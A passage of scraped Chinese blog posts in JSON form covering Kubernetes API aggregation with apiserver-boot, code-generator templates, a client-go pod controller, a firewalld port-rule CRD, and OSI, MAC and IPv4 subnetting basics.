--generate=false 跳过生成，这样就可以节省大量时间。\n运行方式 运行方式无非三种，本地运行，集群内运行，集群外运行\nrunning_locally 本地运行需要有一个etcd服务，不用配置ca证书，这里使用docker运行\ndocker run -d --name Etcd-server \\ --publish 2379:2379 \\ --publish 2380:2380 \\ --env ALLOW_NONE_AUTHENTICATION=yes \\ --env ETCD_ADVERTISE_CLIENT_URLS=http://etcd-server:2379 \\ bitnami/etcd:latest 然后执行命令，执行成功后会弹出对应的访问地址\napiserver-boot build executables apiserver-boot run local running_in_cluster 构建镜像 需要先构建容器镜像，apiserver-boot build container --image \u0026lt;image\u0026gt; 这将生成代码，构建 apiserver 和controller二进制文件，然后构建容器映像。构建完成后还需要将对应的镜像push到仓库（可选）\napiserver-boot build config \\ --name \u0026lt;servicename\u0026gt; \\ --namespace \u0026lt;namespace to run in\u0026gt; \\ --image \u0026lt;image to run\u0026gt; 注，这个操作需要在支持Linux内核的环境下构建，wsl不具备内核功能故会报错，需要替换为wsl2，而工具是下载的，如果需要wsl1+Docker Desktop构建，需要自己修改\n构建配置 apiserver-boot build config \\ --name \u0026lt;servicename\u0026gt; \\ --namespace \u0026lt;namespace to run in\u0026gt; \\ --image \u0026lt;image to run\u0026gt; 构建配置的操作会执行以下几个步骤：\n在 \u0026lt;project/config/certificates 目录下创建一个 CA证书 在目录 \u0026lt;project/config/*.yaml 下生成kubernetes所需的资源清单。 注：\n实际上这个清单并不能完美适配任何环境，需要手动修改一下配置\n运行的Pod中包含apiserver与controller，如果使用kubebuilder创建的controller可以自行修改资源清单\n修改apiserver的配置 下面参数是有关于 AA 认证的参数\n--proxy-client-cert-file=/etc/kubernetes/pki/firewalld.crt \\ --proxy-client-key-file=/etc/kubernetes/pki/firewalld.key \\ --requestheader-allowed-names=kube-apiserver-kubelet-client,firewalld.default.svc,firewalld-certificate-authority \\ --requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt \\ --requestheader-extra-headers-prefix=X-Remote-Extra- \\ --requestheader-username-headers：用于存储用户名的标头 --requestheader-group-headers：用于存储组的标题 --requestheader-extra-headers-prefix：附加到所有额外标头的前缀 --proxy-client-key-file ：私钥文件 --proxy-client-cert-file：客户端证书文件 --requestheader-client-ca-file：签署客户端证书文件的 CA 的证书 --requestheader-allowed-names：签名客户端证书中的CN) 由以上信息得知，实际上 apiserver-boot 所生成的ca用不上，需要kubernetes自己的ca进行签署，这里简单提供两个命令，使用kubernetes集群证书进行颁发证书。这里kubernetes集群证书使用kubernetes-generator 生产的。这里根据这个ca再次生成用于 AA 认证的证书。\nopenssl req -new \\ -key firewalld.key \\ -subj \u0026quot;/CN=firewalld.default.svc\u0026quot; \\ -config \u0026lt;(cat /etc/pki/tls/openssl.cnf \u0026lt;(printf \u0026quot;[aa]\\nsubjectAltName=DNS:firewalld, DNS:firewalld.default.svc, DNS:firewalld-certificate-authority, DNS:kubernetes.default.svc\u0026quot;)) \\ -out firewalld.csr openssl ca \\ -in firewalld.csr \\ -cert front-proxy-ca.crt \\ -keyfile front-proxy-ca.key \\ -out firewalld.crt \\ -days 3650 \\ -extensions aa \\ -extfile \u0026lt;(cat /etc/pki/tls/openssl.cnf \u0026lt;(printf \u0026quot;[aa]\\nsubjectAltName=DNS:firewalld, DNS:firewalld.default.svc, DNS:firewalld-certificate-authority, DNS:kubernetes.default.svc\u0026quot;)) 完成后重新生成所需的yaml资源清单即可，通过资源清单来测试下扩展的API\napiVersion: firewalld.fedoraproject.org/v1 kind: PortRule metadata: name: portrule-example spec: name: \u0026quot;nginx\u0026quot; host: \u0026quot;10.0.0.3\u0026quot; port: 80 $ kubectl apply -f http.yaml portrule.firewalld.fedoraproject.org/portrule-example created $ kubectl get portrule NAME CREATED AT portrule-example 2022-06-22T15:12:59Z 更详细的说明建议阅读下Reference，都是官方提供的详细说明文档\nReference aggregation layer\napiserver-builder doc\n","permalink":"https://www.oomkill.com/2022/06/ch04-apiserver-aggregation/","summary":"","title":"扩展Kubernetes API的另一种方式 - APIServer aggregation"},{"content":"Overview Kubernetes中提供了多种自定义控制器的方式：\ncode-generator kubebuilder Operator Controller 作为CRD的核心，这里将解释如何使用 code-generator 来创建自定义的控制器，作为文章的案例，将完成一个 Firewalld Port 规则的控制器作为描述，通过 Kubernetes 规则来生成对应节点上的 iptables规则。\nPrerequisites CRD apiVersion: apiextensions.k8s.io/v1 kind: CustomResourceDefinition metadata: name: ports.firewalld.fedoraproject.org spec: group: firewalld.fedoraproject.org scope: Namespaced names: plural: ports singular: port kind: PortRule shortNames: - fp versions: - name: v1 served: true storage: true schema: openAPIV3Schema: type: object properties: spec: type: object properties: name: type: string port: type: integer host: type: string isPermanent: type: boolean code-generator 需要预先下载 code-generator 。因为这个工具不是必需要求的。\n注意，下载完成后需要将代码库的的分支更改为你目前使用的版本，版本的选择与client-go类似，如果使用master分支，会与当前的 Kubernetes 集群不兼容。\ngit clone https://github.com/kubernetes/code-generator cd code-generator; git checkout {version} # eg. v0.18.0 编写代码模板 要想使用 code-generator 生成控制器，必须准备三个文件 doc.go , register.go , types.go 。\ndoc.go 中声明了这个包全局内，要使用生成器的tag register.go 类似于kubernetes API，是将声明的类型注册到schema中 type.go 是需要具体声明对象类型 code-generator Tag说明 在使用 code-generator 时，就需要对 code-generator 的tag进行了解。code-generator 的tag是根据几个固定格式进行定义的，tag是 +k8s: + conversion 的组合，在仓库中 cmd 中的 *-gen* 文件夹就代表了 conversion 的替换位置。\n对于 client-gen的tag 参数可以在 code-generator\\cmd\\client-gen\\generators\\util\\tags.go 对于其他类型的使用方法，例如 deepcopy-gen ,可以在包 main.go中看注释说明 +k8s:openapi-gen=true：启用一个生成器 注：最终准备完成的文件（ doc.go , register.go , types.go）应该为：apis/example.com/v1 这种类型的\n需要遵循的是，将这些文件放在 \u0026lt;version\u0026gt; 目录中，例如 v1 。这里 v1, v1alpha1, 根据自己需求定义。\n开始填写文件内容 type.go package v1 import ( metav1 \u0026quot;k8s.io/apimachinery/pkg/apis/meta/v1\u0026quot; ) // +genclient // +genclient:noStatus // +k8s:deepcopy-gen:interfaces=k8s.io/apimachinery/pkg/runtime.Object type Port struct { metav1.TypeMeta `json:\u0026quot;,inline\u0026quot;` // Standard object metadata. // +optional metav1.ObjectMeta `json:\u0026quot;metadata,omitempty\u0026quot; protobuf:\u0026quot;bytes,1,opt,name=metadata\u0026quot;` // Specification of the desired behavior of the Deployment. // +optional Spec PortSpec `json:\u0026quot;spec,omitempty\u0026quot; protobuf:\u0026quot;bytes,2,opt,name=spec\u0026quot;` } // +k8s:deepcopy-gen=false type PortSpec struct { Name string `json:\u0026quot;name\u0026quot;` Host string `json:\u0026quot;host\u0026quot;` Port int `json:\u0026quot;port\u0026quot;` IsPermanent bool `json:\u0026quot;isPermanent\u0026quot;` } // +k8s:deepcopy-gen:interfaces=k8s.io/apimachinery/pkg/runtime.Object type PortList struct { metav1.TypeMeta `json:\u0026quot;,inline\u0026quot;` // +optional metav1.ListMeta `json:\u0026quot;metadata,omitempty\u0026quot;` Items []Port `json:\u0026quot;items\u0026quot;` } doc.go // +k8s:deepcopy-gen=package // +k8s:protobuf-gen=package // +k8s:openapi-gen=true // +groupName=firewalld.fedoraproject.org package v1 // import \u0026quot;k8s.io/api/firewalld/v1\u0026quot; register.go 这里是从 k8s.io/api 里任意一个复制的，例如 k8s.io/api/core/v1/register.go\npackage v1 import ( metav1 \u0026quot;k8s.io/apimachinery/pkg/apis/meta/v1\u0026quot; \u0026quot;k8s.io/apimachinery/pkg/runtime\u0026quot; \u0026quot;k8s.io/apimachinery/pkg/runtime/schema\u0026quot; ) // GroupName is the group name use in this package const GroupName = \u0026quot;firewalld.fedoraproject.org\u0026quot; // SchemeGroupVersion is group version used to register these objects var SchemeGroupVersion = schema.GroupVersion{Group: GroupName, Version: \u0026quot;v1\u0026quot;} // Resource takes an unqualified resource and returns a Group qualified GroupResource func Resource(resource string) schema.GroupResource { return SchemeGroupVersion.WithResource(resource).GroupResource() } var ( // TODO: move SchemeBuilder with zz_generated.deepcopy.go to k8s.io/api. // localSchemeBuilder and AddToScheme will stay in k8s.io/kubernetes. SchemeBuilder = runtime.NewSchemeBuilder(addKnownTypes) localSchemeBuilder = \u0026amp;SchemeBuilder AddToScheme = localSchemeBuilder.AddToScheme ) // Adds the list of known types to the given scheme. func addKnownTypes(scheme *runtime.Scheme) error { scheme.AddKnownTypes(SchemeGroupVersion, \u0026amp;Port{}, \u0026amp;PortList{}, ) metav1.AddToGroupVersion(scheme, SchemeGroupVersion) return nil } 生成所需文件 使用 code-generator 时，实际上就是使用这个库中的脚本 generate-groups.sh ，该脚本又四个参数\n第一个参数：使用那些生成器，就是 *.gen，用逗号分割，all表示使用全部 第二个参数：client（client-go中informer, lister等）生成的文件存放到哪里 第三个参数：api（api结构，k8s.io/api/） 生成的文件存放到哪里，可以和定义的文件为一个目录 第四个参数：定义group:version -output-base：输出包存放的根目录 -go-header-file：生成文件的头注释信息，这个是必要参数，除非生成失败 注：对于参数二，三，与-output-base，指定的路径，这里可以使用相对路径也可以使用go.mod中的定义的包名，对于使用相对路径而言，生成的文件中的import也将会为 \u0026ldquo;../../\u0026rdquo; 的格式\n一个完整的示例\n../code-generator/generate-groups.sh all \\ ../code-controller/client \\ ../code-controller/apis \\ firewalld:v1 \\ --output-base ../code-controller/ \\ --go-header-file ../code-generator/hack/boilerplate.go.txt Reference\nCRD Programming\n","permalink":"https://www.oomkill.com/2022/06/ch14-code-generator/","summary":"","title":"kubernetes代码生成器 - code-generator"},{"content":"Overview 根据Kuberneter文档对Controller的描述，Controller在kubernetes中是负责协调的组件，根据设计模式可知，controller会不断的你的对象（如Pod）从当前状态与期望状态同步的一个过程。当然Controller会监听你的实际状态与期望状态。\nWriting Controllers package main import ( \u0026quot;flag\u0026quot; \u0026quot;fmt\u0026quot; \u0026quot;os\u0026quot; \u0026quot;time\u0026quot; v1 \u0026quot;k8s.io/api/core/v1\u0026quot; \u0026quot;k8s.io/apimachinery/pkg/fields\u0026quot; utilruntime \u0026quot;k8s.io/apimachinery/pkg/util/runtime\u0026quot; \u0026quot;k8s.io/apimachinery/pkg/util/wait\u0026quot; \u0026quot;k8s.io/client-go/kubernetes\u0026quot; \u0026quot;k8s.io/client-go/rest\u0026quot; \u0026quot;k8s.io/client-go/tools/cache\u0026quot; \u0026quot;k8s.io/client-go/tools/clientcmd\u0026quot; \u0026quot;k8s.io/client-go/util/homedir\u0026quot; \u0026quot;k8s.io/client-go/util/workqueue\u0026quot; \u0026quot;k8s.io/klog\u0026quot; ) type Controller struct { lister cache.Indexer controller cache.Controller queue workqueue.RateLimitingInterface } func NewController(lister cache.Indexer, controller cache.Controller, queue workqueue.RateLimitingInterface) *Controller { return \u0026amp;Controller{ lister: lister, controller: controller, queue: queue, } } func (c *Controller) processItem() bool { item, quit := c.queue.Get() if quit { return false } defer c.queue.Done(item) fmt.Println(item) err := c.processWrapper(item.(string)) if err != nil { c.handleError(item.(string)) } return true } func (c *Controller) handleError(key string) { if c.queue.NumRequeues(key) \u0026lt; 3 { c.queue.AddRateLimited(key) return } c.queue.Forget(key) klog.Infof(\u0026quot;Drop Object %s in queue\u0026quot;, key) } func (c *Controller) processWrapper(key string) error { item, exists, err := c.lister.GetByKey(key) if err != nil { klog.Error(err) return err } if !exists { klog.Info(fmt.Sprintf(\u0026quot;item %v not exists in cache.\\n\u0026quot;, item)) } else { fmt.Println(item.(*v1.Pod).GetName()) } return err } func (c *Controller) Run(threadiness int, stopCh chan struct{}) { defer utilruntime.HandleCrash() defer c.queue.ShutDown() klog.Infof(\u0026quot;Starting custom controller\u0026quot;) go c.controller.Run(stopCh) if !cache.WaitForCacheSync(stopCh, c.controller.HasSynced) { utilruntime.HandleError(fmt.Errorf(\u0026quot;sync failed.\u0026quot;)) return } for i := 0; i \u0026lt; threadiness; i++ { go wait.Until(func() { for c.processItem() { } }, time.Second, stopCh) } \u0026lt;-stopCh klog.Info(\u0026quot;Stopping custom controller\u0026quot;) } func main() { var ( k8sconfig *string //使用kubeconfig配置文件进行集群权限认证 restConfig *rest.Config err error ) if home := homedir.HomeDir(); home != \u0026quot;\u0026quot; { k8sconfig = flag.String(\u0026quot;kubeconfig\u0026quot;, fmt.Sprintf(\u0026quot;%s/.kube/config\u0026quot;, home), \u0026quot;kubernetes auth config\u0026quot;) } k8sconfig = k8sconfig flag.Parse() if _, err := os.Stat(*k8sconfig); err != nil { panic(err) } if restConfig, err = rest.InClusterConfig(); err != nil { // 这里是从masterUrl 或者 kubeconfig传入集群的信息，两者选一 restConfig, err = clientcmd.BuildConfigFromFlags(\u0026quot;\u0026quot;, *k8sconfig) if err != nil { panic(err) } } restset, err := kubernetes.NewForConfig(restConfig) lister := cache.NewListWatchFromClient(restset.CoreV1().RESTClient(), \u0026quot;pods\u0026quot;, \u0026quot;default\u0026quot;, fields.Everything()) queue := workqueue.NewRateLimitingQueue(workqueue.DefaultControllerRateLimiter()) indexer, controller := cache.NewIndexerInformer(lister, \u0026amp;v1.Pod{}, 0, cache.ResourceEventHandlerFuncs{ AddFunc: func(obj interface{}) { fmt.Println(\u0026quot;add \u0026quot;, obj.(*v1.Pod).GetName()) key, err := cache.MetaNamespaceKeyFunc(obj) if err == nil { queue.Add(key) } }, UpdateFunc: func(oldObj, newObj interface{}) { fmt.Println(\u0026quot;update\u0026quot;, newObj.(*v1.Pod).GetName()) if newObj.(*v1.Pod).Status.Conditions[0].Status == \u0026quot;True\u0026quot; { fmt.Println(\u0026quot;update: the Initialized Status\u0026quot;, newObj.(*v1.Pod).Status.Conditions[0].Status) } else { fmt.Println(\u0026quot;update: the Initialized Status \u0026quot;, newObj.(*v1.Pod).Status.Conditions[0].Status) fmt.Println(\u0026quot;update: the Initialized Reason \u0026quot;, newObj.(*v1.Pod).Status.Conditions[0].Reason) } if len(newObj.(*v1.Pod).Status.Conditions) \u0026gt; 1 { if newObj.(*v1.Pod).Status.Conditions[1].Status == \u0026quot;True\u0026quot; { fmt.Println(\u0026quot;update: the Ready Status\u0026quot;, newObj.(*v1.Pod).Status.Conditions[1].Status) } else { fmt.Println(\u0026quot;update: the Ready Status \u0026quot;, newObj.(*v1.Pod).Status.Conditions[1].Status) fmt.Println(\u0026quot;update: the Ready Reason \u0026quot;, newObj.(*v1.Pod).Status.Conditions[1].Reason) } if newObj.(*v1.Pod).Status.Conditions[2].Status == \u0026quot;True\u0026quot; { fmt.Println(\u0026quot;update: the PodCondition Status\u0026quot;, newObj.(*v1.Pod).Status.Conditions[2].Status) } else { fmt.Println(\u0026quot;update: the PodCondition Status \u0026quot;, newObj.(*v1.Pod).Status.Conditions[2].Status) fmt.Println(\u0026quot;update: the PodCondition Reason \u0026quot;, newObj.(*v1.Pod).Status.Conditions[2].Reason) } if newObj.(*v1.Pod).Status.Conditions[3].Status == \u0026quot;True\u0026quot; { fmt.Println(\u0026quot;update: the PodScheduled Status\u0026quot;, newObj.(*v1.Pod).Status.Conditions[3].Status) } else { fmt.Println(\u0026quot;update: the PodScheduled Status \u0026quot;, newObj.(*v1.Pod).Status.Conditions[3].Status) fmt.Println(\u0026quot;update: the PodScheduled Reason \u0026quot;, newObj.(*v1.Pod).Status.Conditions[3].Reason) } } }, DeleteFunc: func(obj interface{}) { fmt.Println(\u0026quot;delete \u0026quot;, obj.(*v1.Pod).GetName(), \u0026quot;Status \u0026quot;, obj.(*v1.Pod).Status.Phase) // 上面是事件函数的处理，下面是对workqueue的操作 key, err := cache.MetaNamespaceKeyFunc(obj) if err == nil { queue.Add(key) } }, }, cache.Indexers{}) c := NewController(indexer, controller, queue) stopCh := make(chan struct{}) stopCh1 := make(chan struct{}) c.Run(1, stopCh) defer close(stopCh) \u0026lt;-stopCh1 } 通过日志可以看出，Pod create后的步骤大概为4步：\nInitialized：初始化好后状态为Pending PodScheduled：然后调度 PodCondition Ready add netbox default/netbox netbox update netbox status Pending to Pending update: the Initialized Status True update netbox status Pending to Pending update: the Initialized Status True update: the Ready Status False update: the Ready Reason ContainersNotReady update: the PodCondition Status False update: the PodCondition Reason ContainersNotReady update: the PodScheduled Status True update netbox status Pending to Running update: the Initialized Status True update: the Ready Status True update: the PodCondition Status True update: the PodScheduled Status True 大致上与 kubectl describe pod 看到的内容页相似\ndefault-scheduler Successfully assigned default/netbox to master-machine Normal Pulling 85s kubelet Pulling image \u0026quot;cylonchau/netbox\u0026quot; Normal Pulled 30s kubelet Successfully pulled image \u0026quot;cylonchau/netbox\u0026quot; Normal Created 30s kubelet Created container netbox Normal Started 30s kubelet Started container netbox Reference controllers.md\n","permalink":"https://www.oomkill.com/2022/06/ch12-controller/","summary":"","title":"手写一个kubernetes controller"},{"content":"Kubernetes的主节点或控制面板当中主要有三个组件，其中apiserver是整个系统的数据库，借助于Cluster Store（etcd）服务，来实现所有的包括用户所期望状态的定义，以及集群上资源当前状态的实时记录等。\netcd是分布式通用的K/V系统 KV Store ，可存储用户所定义的任何由KV Store所支持的可持久化的数据。它不仅仅被apiserver所使用，如flannel、calico二者也需要以etcd来保存当前应用程序对应的存储数据。 任何一个分布式应用程序几乎都会用到一个高可用的存储系统。\napiserver将etcd所提供的存储接口做了高度抽象，使用户通过apiserver来完成数据存取时，只能使用apiserver中所内建支持的数据范式。在某种情况之下，我们所期望管理的资源或存储对象在现有的Kubernetes资源无法满足需求时。\nOperator本身是建构在StatefulSet以及本身的基本Kubernetes资源之上，由开发者自定义的更高级的、更抽象的自定义资源类型。他可借助于底层的Pod、Service功能，再次抽象出新资源类型。更重要的是，整个集群本身可抽象成一个单一资源。\n为了实现更高级的资源管理，需要利用已有的基础资源类型，做一个更高级的抽象，来定义成更能符合用户所需要的、可单一管理的资源类型，而无需去分别管理每一个资源。\n在Kubernetes之上自定义资源一般被称为扩展Kubernetes所支持的资源类型，\n自定义资源类型 CRD Custom Resource Definition 自定义apiserver 修改APIServer源代码，改动内部的资源类型定义 CRD是kubernetes内建的资源类型，从而使得用户可以定义的不是具体的资源，而是资源类型，也是扩展Kubernetes最简单的方式。\nIntorduction CRD 什么是CRD 在 Kubernetes API 中，resources 是存储 API 对象集合的endpoint。例如，内置 Pod resource 包含 Pod 对象的集合。当我们想扩展API，原生的Kubernetes就不能满足我们的需求了，这时 CRD (CustomResourceDefinition) 就出现了。在 Kubernetes 中创建了 CRD 后，就可以像使用任何其他原生 Kubernetes 对象一样使用它，从而利用 Kubernetes 的所有功能、如安全性、API 服务、RBAC 等。\nKubernetes 1.7 之后增加了对 CRD 自定义资源二次开发能力来扩展 Kubernetes API，通过 CRD 我们可以向 Kubernetes API 中增加新资源类型，而不需要修改 Kubernetes 源码来创建自定义的 API server，该功能大大提高了 Kubernetes 的扩展能力。\n创建 CRD 前提条件： Kubernetes 服务器版本必须不低于版本 1.16\n再创建新的 CustomResourceDefinition（CRD）时，Kubernetes API 服务器会为指定的每一个版本生成一个 RESTful 的资源路径。（即定义一个Restful API）。CRD 可以是namespace作用域的，也可以是cluster作用域的，取决于 CRD 的 scope 字段设置。和其他现有的内置对象一样，删除一个namespace时，该namespace下的所有定制对象也会被删除。CustomResourceDefinition 本身是不受名字空间限制的，对所有名字空间可用。\n例如，编写一个firewall port 规则：\n# 1.16版本后固定格式\rapiVersion: apiextensions.k8s.io/v1\r# 类型crd\rkind: CustomResourceDefinition\rmetadata:\r# 必须为name=spec.names.plural + spec.group\rname: ports.firewalld.fedoraproject.org\rspec:\r# api中的group\r# /apis/\u0026lt;group\u0026gt;/\u0026lt;version\u0026gt;/\u0026lt;plural\u0026gt;\rgroup: firewalld.fedoraproject.org\r# 此crd作用于 可选Namespaced|Cluster\rscope: Namespaced\rnames:\r# 名字的复数形式，用于api\rplural: ports\r# 名称的单数形式。用于命令行\rsingular: port\r# 种类，资源清单类型\rkind: PortRule\r# 名字简写，类似允许 CLI 上较短的字符串匹配的资源\rshortNames: - fp\rversions:\r# 定义版本的类型\r- name: v1\r# 通过 served 标志来启用或禁止\rserved: true\r# 其中一个且只有一个版本必需被标记为存储版本\rstorage: true\r# 自定义资源的默认认证的模式\rschema:\r# 使用的版本\ropenAPIV3Schema:\r# 定义一个参数为对象类型\rtype: object\r# 这个参数的类型\rproperties:\r# 参数属性spec\rspec:\r# spec属性的类型为对象\rtype: object\r# 对象属性\rproperties:\r# spec属性name\rname:\r# 类型为string\rtype: string\rport:\rtype: integer\risPermanent:\rtype: boolean\r需要注意的是v1.16版本以后已经 GA了，使用的是v1版本，之前都是vlbeta1，定义规范有部分变化，所以要注意版本变化。\n这个地方的定义和我们定义普通的资源对象比较类似，我们说我们可以随意定义一个自定义的资源对象，但是在创建资源的时候，肯定不是任由我们随意去编写YAML文件的，当我们把上面的CRD文件提交给Kubernetes之后，Kubernetes会对我们提交的声明文件进行校验，从定义可以看出CRD是基于 OpenAPIv3 schem 进行规范的。当然这种校验只是对于字段的类型进行校验，比较初级，如果想要更加复杂的校验，这个时候就需要通过Kubernetes的admission webhook来实现了。关于校验的更多用法，可以前往官方文档查看。\n创建一个crd类型资源\napiVersion: \u0026quot;firewalld.fedoraproject.org/v1\u0026quot;\rkind: PortRule\rmetadata:\rname: http-port\rspec:\rname: \u0026quot;nginx\u0026quot;\rport: 80\risPermanent: false\r查看创建的crd\n$ kubectl get t\rNAME CREATED AT\rfirewallds.port.fedoraproject.org 2022-06-19T09:27:09Z\rReference CRD\nCRD Definition\n","permalink":"https://www.oomkill.com/2022/06/ch13-crd/","summary":"","title":"使用CRD扩展Kubernetes API"},{"content":"OSI Model OSI 七层网络模型如下（由下到上）：\n应用层 Application layer ：直接接触用户数据的层。软件应用程序依靠应用层发起通信。这里的应用值得是协议而不是客户端软件；应用层协议包括 HTTP, SMTP, FTP, DNS,Telnet, etc.. 表示层 Presentation layer：表示层充当角色为网络数据转换器，负责完成数据转换，加密和压缩 会话层 Session layer：负责建立、管理和终止两个设备之间的通信 传输层 Transport layer：负责两个设备间的端到端通信。包括从会话层提取数据，将数据分解为多个区块（称为数据段）；传输层协议包括，TCP, UDP 网络层 Network layer：负责管理网络地址，定位设备，决定路由，通俗来讲是负责*\u0026ldquo;不同\u0026rdquo;*网络之间的传输，也就是路由功能；网络层协议包括 IP,ARP,ICMP；代表设备 3 layer swtich, router, firewall。相应就代表对应网络协议也是三层的，如RIP, OSPF, BGP 数据链路层 Data link layer：数据链路层负责*\u0026ldquo;同一\u0026rdquo;*网络上设备之间的数据传输；该层协议包括 Ethernet, PPP(Point-to-Point Protocol)；代表设备 Switch,Bridges，同样的MAC地址也是该层的 物理层 Physical layer：该层表示参与数据传输的物理设备，如网线，同时还负责将数据转换为位流，也就是由 1 和 0 构成的字符串。 图：OSI七层模型 Source：https://www.cloudflare.com/zh-cn/learning/ddos/glossary/open-systems-interconnection-model-osi/ MAC MAC地址介绍 MAC (Media Access Control) 地址用来定义网络设备的位置，由48比特长，12位的16进制组成，其中从左到右，0-23bit为厂商想IETF等机构申请用来标识厂商的代码OUI Organizationally-Unique Identifier，24-47bit由厂商自行分配，是厂商制造所有网卡的唯一编号。如00-50-56-C0-00-08\nMAC地址类型 MAC地址分为三种类型：\n物理MAC地址：Mac地址唯一的标识了以太网的一个终端，该地址为全球唯一的硬件地址。 广播(broadcast) MAC地址：每个比特都是 1 的 MAC 地址。广播 MAC 地址是组播 MAC 地址的一个特例。11111111-11111111-11111111-11111111-11111111-11111111 16进制表示为 FF-FF-FF-FF-FF-FF。 组播(multicast) MAC地址：第一个字节的最低位是 1 的 MAC 地址。二进制表示为 xxxxxxx1-xxxxxxxx-xxxxxxxx-xxxxxxxx-xxxxxxxx-xxxxxxxx ；16进制表示为01-00-00-00-00-00。如 a5-a9-a6-aa-5a-a6 这个mac地址的第一个字节的最低位 16进制a5 转换为二进制为10100101 最后一位为1就是组播MAC地址。 单播 (unicast) MAC 地址：第一个字节的最低位是 0 的 MAC 地址 xxxxxxx0-xxxxxxxx-xxxxxxxx-xxxxxxxx-xxxxxxxx-xxxxxxxx。 静态MAC地址 由用户通过命令配置的静态转发的MAC地址，静态MAC地址和动态MAC地址的功能不同，静态地址一旦被加入，该地址在删除之前将一直有效，不受最大老化时间的限制\n动态MAC地址 由交换机从接受到报文自动学习到的MAC地址，当端口收到一个报文时，会查找报文的源MAC地址是否存在于MAC地址表中，如果不存在则会将相应的端口、VLAN和源MAC地址关联起来，并保存到MAC地址表中，动态MAC地址在达到一定老化时间后，会被老化删除，但如果该地址在老化时间内被正确使用过，则会重新激活地址的老化时间。\n过滤MAC地址、黑洞MAC地址 有用户通过命令配置的静态过滤MAC，当网关接收到的报文中，源或目的MAC地址为过滤MAC地址，则直接丢弃该报文。\nIP地址 IP地址是在计算机网络中用来标识一个设备的一组数字，IPv4是由32位二进制数值组成，单为了便于用户识别记忆，采用了点分十进制表示法，这种表示法的IPv4地址有4个点分十进制证书来标识，每个十进制证书对应一个字节。\nIPV4 IPv4地址有如下两个部分组成：\n网络段 Net-id：用来标识一个网络。\n主机段 Host-id：用来区分一个网络内的不同主机，对于网络号相同的设备，无论实际所处的物理位置如何，他们都处在同一个网络中。\nIP地址的分类 分类网络 classful addressing，描述互联网网络的一个术语，将IPv4的IP地址分为5类，每个类别地址都由他们前三位标识，定义了网络的大小或者类型。\n类型 前缀位 网络地址位数 剩余的位数 网络数 每个网络的主机数 A类地址 0 8 24 128 16,777,214 B类地址 10 16 16 16,384 65,534 C类地址 110 24 8 2,097,152 254 D类地址（群播） 1110 未定义 未定义 未定义 未定义 E类地址（保留） 1111 未定义 未定义 未定义 未定义 可用的主机地址总是 $2^n - 2$（ n 是所用的位数，减2是因为第一个和最后一个地址都是无效的）。因此，对于用8位来表示主机地址的C类地址来说，主机数就是254。\n分类 前缀码 开始地址 结束地址 对应CIDR修饰 默认子网掩码 A类地址 0 0.0.0.0 127.255.255.255 /8 255.0.0.0 B类地址 10 128.0.0.0 191.255.255.255 /16 255.255.0.0 C类地址 110 192.0.0.0 223.255.255.255 /24 255.255.255.0 D类地址 （群播） 1110 224.0.0.0 239.255.255.255 /4 未定义 E类地址 （保留） 1111 240.0.0.0 255.255.255.255 /4 未定义 A类地址 0. 0. 0. 0 = 00000000.00000000.00000000.00000000 127.255.255.255 = 01111111.11111111.11111111.11111111 0nnnnnnn.HHHHHHHH.HHHHHHHH.HHHHHHHH B类地址 128. 0. 0. 0 = 10000000.00000000.00000000.00000000 191.255.255.255 = 10111111.11111111.11111111.11111111 10nnnnnn.nnnnnnnn.HHHHHHHH.HHHHHHHH C类地址 192. 0. 0. 0 = 11000000.00000000.00000000.00000000 223.255.255.255 = 11011111.11111111.11111111.11111111 110nnnnn.nnnnnnnn.nnnnnnnn.HHHHHHHH D类地址 224. 0. 0. 0 = 11100000.00000000.00000000.00000000 239.255.255.255 = 11101111.11111111.11111111.11111111 1110XXXX.XXXXXXXX.XXXXXXXX.XXXXXXXX E类地址 240. 0. 0. 0 = 11110000.00000000.00000000.00000000 255.255.255.255 = 11111111.11111111.11111111.11111111 1111XXXX.XXXXXXXX.XXXXXXXX.XXXXXXXX 专用 IP 地址 专用 IP 地址是内部地址，不能通过互联网路由，例如 RFC 1918 地址。所有专用 IP 地址都是内部 IP 地址；但是，并非所有内部 IP 地址都是专用 IP 地址。\n因特网域名分配组织IANA组织（Internet Assigned Numbers Authority）保留了以下三个IP地址块用于私有网络。\n10.0.0.0 - 10.255.255.255 (10/8比特前缀)\n172.16.0.0 - 172.31.255.255 (172.16/12比特前缀)\n192.168.0.0 - 192.168.255.255 (192.168/16比特前缀)\nVLSM 可变长子网掩码 VLSM ，是为了有效使用无类别域间路由(CIDR)和路由汇聚(route summary)来控制路由表的大小，它是网络管理员常用的IP寻址技术，VLSM就是其中的常用方式，可以对子网进行层次化编址，以便最有效的利用现有的地址空间。\nVLSM的优点：\nIP地址的使用更加有效 应用路由汇总时，有更好的性能 与其他路由器的拓扑变化隔离 如 192.168.1.0/24 其二进制地址为\n11000000.10101000.00000001.00000000\n⑴ 确定子网掩码的长度为24；\n⑵ 确定子网下的主机可用地址范围 $2^n - 2$ 即为 192.168.1.1 ~ 192.168.1.254 （第一个可用IP和最后一个可用IP）；\n⑶ 确定网络地址（主机位全为0 192.168.0.0）和广播地址（主机位全为1 192.168.0.255）不能分配计算机主机。\nVLSM允许把子网继续划分为更小的网络\n子网掩码 子网数 主机数 IP数 /25255.255.255.1| 0000000255.255.255.128 2\n192.168.0.0 ~ 192.168.0.127\n192.168.0.128 ~ 192.168.0.254 $2^n - 2=128-2=126$ 128 /26255.255.255.11 | 000000255.255.255.192 4192.168.0.0 ~ 192.168.0.63192.168.0.64 ~ 192.168.0.127192.168.0.128 ~ 192.168.0.191192.168.0.192 ~ 192.168.0.255 $2^n - 2=64-2=62$ 64 /27255.255.255.111 | 00000255.255.255.224 8192.168.0.0 ~ 192.168.0.31192.168.0.32 ~ 192.168.0.63192.168.0.64 ~ 192.168.0.95192.168.0.96 ~ 192.168.0.127192.168.0.128 ~ 192.168.0.159192.168.0.160 ~ 192.168.0.191192.168.0.192 ~ 192.168.0.223192.168.0.224 ~ 192.168.0.255 $2^n - 2=32-2=30$ 32 /28255.255.255.1111 | 0000255.255.255.240 16192.168.0.0 ~ 192.168.0.15192.168.0.16 ~ 192.168.0.31\u0026hellip;\n192.168.0.224 ~ 192.168.0.239192.168.0.240 ~ 192.168.0.255 $2^n - 2=16-2=14$ 16 /29255.255.255.11111 | 000255.255.255.248 32192.168.0.0 ~ 192.168.0.7192.168.0.8 ~ 192.168.0.15\u0026hellip;192.168.0.232 ~ 192.168.0.247192.168.0.248 ~ 192.168.0.255 $2^n - 2=8-2=6$ 8 /30255.255.255.111111 | 00255.255.255.252 64192.168.0.0 ~ 192.168.0.3192.168.0.4 ~ 